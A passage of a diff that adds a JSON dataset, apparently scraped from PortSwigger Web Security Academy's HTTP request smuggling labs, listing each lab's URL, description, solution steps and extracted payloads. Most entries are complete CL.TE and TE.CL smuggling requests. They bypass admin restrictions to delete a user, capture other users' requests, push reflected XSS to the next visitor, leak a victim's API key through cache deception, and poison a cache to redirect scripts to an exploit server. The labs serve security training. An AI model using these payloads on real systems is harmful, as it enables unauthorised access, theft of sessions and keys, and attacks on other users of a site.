+      "Using the previous response as a reference, change the smuggled request URL to delete carlos : POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n87\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0"
+    ],
+    "solution": "1. Try to visit /admin and observe that the request is blocked.\n2. In Burp Suite, go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.\n3. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n60\nPOST /admin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0 Note You need to include the trailing sequence \\r\\n\\r\\n following the final 0 .\n4. Observe that the merged request to /admin was rejected due to not using the header Host: localhost .\n5. Issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n71\nPOST /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n6. Observe that you can now access the admin panel.\n7. Using the previous response as a reference, change the smuggled request URL to delete carlos : POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n87\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0",
+    "payloads": [
+      "/admin",
+      "carlos",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n60\nPOST /admin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0",
+      "\\r\\n\\r\\n",
+      "Host: localhost",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n71\nPOST /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n87\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests",
+    "category": "request-smuggling",
+    "title": "Exploiting HTTP request smuggling to capture other users' requests",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.",
+    "solution": "If you encounter a timeout, this may indicate that the number of bytes you're trying to capture is greater than the total number of bytes in the subsequent request. Try reducing the\nContent-Length\nspecified in the smuggled request prefix.",
+    "payloads": [
+      "Content-Length",
+      "comment-post",
+      "comment",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 256\nTransfer-Encoding: chunked\n\n0\n\nPOST /post/comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 400\nCookie: session=your-session-token\n\ncsrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss",
+    "category": "request-smuggling",
+    "title": "Exploiting HTTP request smuggling to deliver reflected XSS",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.",
+    "solution_steps": [
+      "Visit a blog post, and send the request to Burp Repeater.",
+      "Observe that the comment form contains your User-Agent header in a hidden input.",
+      "Inject an XSS payload into the User-Agent header and observe that it gets reflected: \"/><script>alert(1)</script>",
+      "Smuggle this XSS request to the back-end server, so that it exploits the next visitor: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 150\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=5 HTTP/1.1\nUser-Agent: a\"/><script>alert(1)</script>\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1"
+    ],
+    "solution": "1. Visit a blog post, and send the request to Burp Repeater.\n2. Observe that the comment form contains your User-Agent header in a hidden input.\n3. Inject an XSS payload into the User-Agent header and observe that it gets reflected: \"/><script>alert(1)</script>\n4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 150\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=5 HTTP/1.1\nUser-Agent: a\"/><script>alert(1)</script>\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1",
+    "payloads": [
+      "User-Agent",
+      "alert(1)",
+      "\"/><script>alert(1)</script>",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 150\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=5 HTTP/1.1\nUser-Agent: a\"/><script>alert(1)</script>\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception",
+    "category": "request-smuggling",
+    "title": "Exploiting HTTP request smuggling to perform web cache deception",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.",
+    "solution_steps": [
+      "Log in to your account and access the user account page.",
+      "Observe that the response doesn't have any anti-caching headers.",
+      "Smuggle a request to fetch the API key: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 42\nTransfer-Encoding: chunked\n\n0\n\nGET /my-account HTTP/1.1\nX-Ignore: X",
+      "Repeat this request a few times, then load the home page in an incognito browser window.",
+      "Use the Search function on the Burp menu to see if the phrase \"Your API Key\" has appeared in any static resources. If it hasn't, repeat the POST requests, force-reload the browser window, and re-run the search.",
+      "Submit the victim's API key as the lab solution."
+    ],
+    "solution": "1. Log in to your account and access the user account page.\n2. Observe that the response doesn't have any anti-caching headers.\n3. Smuggle a request to fetch the API key: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 42\nTransfer-Encoding: chunked\n\n0\n\nGET /my-account HTTP/1.1\nX-Ignore: X\n4. Repeat this request a few times, then load the home page in an incognito browser window.\n5. Use the Search function on the Burp menu to see if the phrase \"Your API Key\" has appeared in any static resources. If it hasn't, repeat the POST requests, force-reload the browser window, and re-run the search.\n6. Submit the victim's API key as the lab solution.",
+    "payloads": [
+      "wiener:peter",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 42\nTransfer-Encoding: chunked\n\n0\n\nGET /my-account HTTP/1.1\nX-Ignore: X"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning",
+    "category": "request-smuggling",
+    "title": "Exploiting HTTP request smuggling to perform web cache poisoning",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.",
+    "solution_steps": [
+      "Open a blog post, click \"Next post\", and try smuggling the resulting request with a different Host header: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 129\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: anything\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1",
+      "Observe that you can use this request to make the next request to the website get redirected to /post on a host of your choice.",
+      "Go to your exploit server, and create a text/javascript file at /post with the contents: alert(document.cookie)",
+      "Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 193\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1",
+      "Then fetch /resources/js/tracking.js by sending the following request: GET /resources/js/tracking.js HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: close If the attack has succeeded, the response to the tracking.js request should be a redirect to your exploit server.",
+      "Confirm that the cache has been poisoned by repeating the request to tracking.js several times and confirming that you receive the redirect every time."
+    ],
+    "solution": "1. Open a blog post, click \"Next post\", and try smuggling the resulting request with a different Host header: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 129\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: anything\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1\n2. Observe that you can use this request to make the next request to the website get redirected to /post on a host of your choice.\n3. Go to your exploit server, and create a text/javascript file at /post with the contents: alert(document.cookie)\n4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 193\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1\n5. Then fetch /resources/js/tracking.js by sending the following request: GET /resources/js/tracking.js HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: close If the attack has succeeded, the response to the tracking.js request should be a redirect to your exploit server.\n6. Confirm that the cache has been poisoned by repeating the request to tracking.js several times and confirming that you receive the redirect every time.",
+    "payloads": [
+      "document.cookie",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 129\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: anything\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1",
+      "/post",
+      "text/javascript",
+      "alert(document.cookie)",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 193\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1",
+      "/resources/js/tracking.js",
+      "GET /resources/js/tracking.js HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: close",
+      "tracking.js"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting",
+    "category": "request-smuggling",
+    "title": "Exploiting HTTP request smuggling to reveal front-end request rewriting",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.",
+    "solution_steps": [
+      "Browse to /admin and observe that the admin panel can only be loaded from 127.0.0.1 .",
+      "Use the site's search function and observe that it reflects the value of the search parameter.",
+      "Use Burp Repeater to issue the following request twice. POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 124\nTransfer-Encoding: chunked\n\n0\n\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nConnection: close\n\nsearch=test",
+      "The second response should contain \"Search results for\" followed by the start of a rewritten HTTP request.",
+      "Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 143\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1",
+      "Using the previous response as a reference, change the smuggled request URL to delete the user carlos : POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 166\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1"
+    ],
+    "solution": "1. Browse to /admin and observe that the admin panel can only be loaded from 127.0.0.1 .\n2. Use the site's search function and observe that it reflects the value of the search parameter.\n3. Use Burp Repeater to issue the following request twice. POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 124\nTransfer-Encoding: chunked\n\n0\n\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nConnection: close\n\nsearch=test\n4. The second response should contain \"Search results for\" followed by the start of a rewritten HTTP request.\n5. Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 143\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1\n6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos : POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 166\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1",
+    "payloads": [
+      "/admin",
+      "X-Forwarded-For",
+      "carlos",
+      "127.0.0.1",
+      "search",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 124\nTransfer-Encoding: chunked\n\n0\n\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nConnection: close\n\nsearch=test",
+      "X-*-IP",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 143\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 166\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses",
+    "category": "request-smuggling",
+    "title": "HTTP request smuggling, confirming a CL.TE vulnerability via differential responses",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.",
+    "solution": "Using Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\nTransfer-Encoding: chunked\n\n0\n\nGET /404 HTTP/1.1\nX-Ignore: X\nThe second request should receive an HTTP 404 response.",
+    "payloads": [
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\nTransfer-Encoding: chunked\n\n0\n\nGET /404 HTTP/1.1\nX-Ignore: X"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses",
+    "category": "request-smuggling",
+    "title": "HTTP request smuggling, confirming a TE.CL vulnerability via differential responses",
+    "description": "This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.",
+    "solution": "In Burp Suite, go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.\nUsing Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5e\nPOST /404 HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\nThe second request should receive an HTTP 404 response.",
+    "payloads": [
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5e\nPOST /404 HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te",
+    "category": "request-smuggling",
+    "title": "HTTP request smuggling, basic CL.TE vulnerability",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.",
+    "solution": "Using Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG\nThe second response should say:\nUnrecognized method GPOST\n.",
+    "payloads": [
+      "GPOST",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG",
+      "Unrecognized method GPOST"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl",
+    "category": "request-smuggling",
+    "title": "HTTP request smuggling, basic TE.CL vulnerability",
+    "description": "This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.",
+    "solution": "In Burp Suite, go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.\nUsing Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\nNote\nYou need to include the trailing sequence\n\\r\\n\\r\\n\nfollowing the final\n0\n.\nThe second response should say:\nUnrecognized method GPOST\n.",
+    "payloads": [
+      "GPOST",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0",
+      "\\r\\n\\r\\n",
+      "Unrecognized method GPOST"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header",
+    "category": "request-smuggling",
+    "title": "HTTP request smuggling, obfuscating the TE header",
+    "description": "This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.",
+    "solution": "In Burp Suite, go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.\nUsing Burp Repeater, issue the following request twice:\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: cow\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\nNote\nYou need to include the trailing sequence\n\\r\\n\\r\\n\nfollowing the final\n0\n.\nThe second response should say:\nUnrecognized method GPOST\n.",
+    "payloads": [
+      "GPOST",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: cow\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0",
+      "\\r\\n\\r\\n",
+      "Unrecognized method GPOST"
+    ]
+  }
+]
